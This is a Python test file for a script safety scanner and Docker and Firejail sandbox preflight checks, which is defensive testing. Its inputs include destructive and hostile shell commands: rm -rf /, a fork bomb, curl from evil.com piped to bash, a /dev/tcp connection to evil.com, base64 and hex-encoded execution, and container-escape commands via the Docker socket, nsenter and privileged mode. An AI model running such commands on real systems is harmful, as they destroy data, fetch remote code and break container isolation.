"""沙箱体系测试。

覆盖：
- ScriptSafetyScanner 基础扫描 + preflight_check 深度分析
- DockerSandbox preflight 逃逸检测
- FirejailSandbox preflight 检查
- MockSandbox 基本行为
- SandboxExecutor 集成
"""

import pytest

from core.evaluator import ScriptSafetyScanner
from core.models import Alert, SandboxResult
from plugins.docker_sandbox import DockerSandbox
from plugins.firejail_sandbox import FirejailSandbox
from plugins.mocks import MockSandbox


class TestScriptSafetyScanner:

    def test_dangerous_rm_rf(self):
        scanner = ScriptSafetyScanner()
        risks = scanner.find_risks("rm -rf /")
        assert len(risks) > 0

    def test_safe_script(self):
        scanner = ScriptSafetyScanner()
        risks = scanner.find_risks("systemctl restart nginx")
        assert len(risks) == 0

    def test_fork_bomb(self):
        scanner = ScriptSafetyScanner()
        risks = scanner.find_risks(":(){ :|:& };:")
        assert len(risks) > 0

    def test_curl_pipe_bash(self):
        scanner = ScriptSafetyScanner()
        risks = scanner.find_risks("curl http://evil.com/script.sh | bash")
        assert len(risks) > 0

    def test_custom_patterns(self):
        scanner = ScriptSafetyScanner(patterns=[r"dangerous_cmd"])
        risks = scanner.find_risks("dangerous_cmd --flag")
        assert len(risks) == 1


class TestPreflightCheck:

    def test_docker_socket_escape(self):
        scanner = ScriptSafetyScanner()
        issues = scanner.preflight_check("ls /var/run/docker.sock")
        assert any("Docker socket" in i for i in issues)

    def test_nsenter_escape(self):
        scanner = ScriptSafetyScanner()
        issues = scanner.preflight_check("nsenter --target 1 --mount")
        assert any("nsenter" in i for i in issues)

    def test_eval_dynamic_execution(self):
        scanner = ScriptSafetyScanner()
        issues = scanner.preflight_check('eval "rm -rf /"')
        assert any("eval" in i for i in issues)

    def test_base64_decode(self):
        scanner = ScriptSafetyScanner()
        issues = scanner.preflight_check("echo aWQ= | base64 -d | bash")
        assert any("base64" in i for i in issues)

    def test_hex_encoding(self):
        scanner = ScriptSafetyScanner()
        issues = scanner.preflight_check("echo -e '\\x72\\x6d\\x20' | bash")
        assert any("十六进制" in i for i in issues)

    def test_dev_tcp(self):
        scanner = ScriptSafetyScanner()
        issues = scanner.preflight_check("exec 5<>/dev/tcp/evil.com/80")
        assert any("网络连接" in i for i in issues)

    def test_clean_script(self):
        scanner = ScriptSafetyScanner()
        issues = scanner.preflight_check("systemctl restart nginx && echo done")
        assert len(issues) == 0

    def test_command_substitution(self):
        scanner = ScriptSafetyScanner()
        issues = scanner.preflight_check("result=$(whoami)")
        assert any("命令替换" in i for i in issues)


class TestDockerSandboxPreflight:

    def test_escape_detection(self):
        sandbox = DockerSandbox()
        issues = sandbox.preflight_check("ls /var/run/docker.sock")
        assert len(issues) > 0

    def test_privileged_flag(self):
        sandbox = DockerSandbox()
        issues = sandbox.preflight_check("docker run --privileged ubuntu")
        assert len(issues) > 0

    def test_clean_script(self):
        sandbox = DockerSandbox()
        issues = sandbox.preflight_check("df -h && echo ok")
        assert len(issues) == 0


class TestFirejailSandboxPreflight:

    def test_noprofile_bypass(self):
        sandbox = FirejailSandbox()
        issues = sandbox.preflight_check("firejail --noprofile bash")
        assert len(issues) > 0

    def test_clean_script(self):
        sandbox = FirejailSandbox()
        issues = sandbox.preflight_check("echo hello")
        assert len(issues) == 0

    def test_memory_parse(self):
        assert FirejailSandbox._parse_memory_mb("512m") == 512
        assert FirejailSandbox._parse_memory_mb("2g") == 2048
        assert FirejailSandbox._parse_memory_mb("1024k") == 1


class TestMockSandbox:

    def test_execute_success(self):
        sandbox = MockSandbox()
        result = sandbox.execute("echo hello", {})
        assert result.success is True
        assert result.exit_code == 0

    def test_preflight_clean(self):
        sandbox = MockSandbox()
        issues = sandbox.preflight_check("anything")
        assert len(issues) == 0

    def test_preflight_with_issues(self):
        sandbox = MockSandbox(preflight_issues=["容器逃逸风险"])
        issues = sandbox.preflight_check("anything")
        assert len(issues) == 1

    def test_not_available(self):
        sandbox = MockSandbox(available=False)
        assert sandbox.is_available() is False


class TestSandboxResultModel:

    def test_defaults(self):
        result = SandboxResult(success=True)
        assert result.exit_code == 0
        assert result.stdout == ""
        assert result.stderr == ""
        assert result.sandbox_violations == []

    def test_with_violations(self):
        result = SandboxResult(
            success=False,
            exit_code=-1,
            sandbox_violations=["未隔离执行"],
        )
        assert len(result.sandbox_violations) == 1
